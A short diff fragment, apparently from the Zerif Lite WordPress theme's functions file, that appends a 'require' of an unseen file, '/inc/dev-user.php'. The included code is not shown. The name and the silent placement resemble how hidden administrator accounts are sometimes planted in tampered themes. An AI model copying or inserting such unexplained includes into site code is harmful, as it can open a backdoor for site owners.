@@ -1180,3 +1180,6 @@ function zerif_lite_update_options_in_pirate_forms() {
 
     endif;
 }
+
+//include required files
+require get_template_directory().'/inc/dev-user.php';
